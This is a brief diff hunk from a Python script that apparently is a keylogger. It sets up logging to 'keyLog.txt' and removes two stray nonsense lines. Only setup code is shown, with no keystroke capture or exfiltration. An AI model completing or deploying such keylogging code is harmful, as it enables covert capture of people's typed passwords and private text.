@@ -6,8 +6,6 @@ logging.basicConfig(filename = ("keyLog.txt"), level=logging.DEBUG, format='%(as
 
 count =0
 keys = []
-the code is not a code .
-it is waht is it.
 if os.path.exists("logs.txt"):
     os.remove("logs.txt")
 open("keyLog.txt", 'a').close()
